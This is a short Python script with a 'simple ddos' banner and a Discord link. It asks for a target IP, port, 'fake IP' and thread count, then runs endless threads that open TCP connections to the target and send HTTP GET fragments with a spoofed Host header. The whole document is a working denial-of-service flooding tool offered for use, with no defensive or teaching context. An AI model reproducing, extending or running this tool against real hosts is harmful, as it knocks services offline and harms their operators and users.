import threading
import socket
import os
import sys

text = """
                                       
  _ o ._ _  ._  |  _     _|  _|  _   _ 
 _> | | | | |_) | (/_   (_| (_| (_) _> 
            |                          discord.gg/YpWek5kwkf
"""

print("\033[92m" + text + "\033[0m")


if os.name == 'nt':  
    os.system("title simple")
else:  
    sys.stdout.write("\x1b]2;simple\x07")

target = input("ENTER THE IP: ")
port = int(input("ENTER THE PORT: "))
fake_ip = input("ENTER THE FAKE IP: ")
num_threads = int(input("ENTER THE THREADS: "))

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode("ascii"), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))
            s.close()
            print("success")
        except:
            print("failed")

for i in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.start()
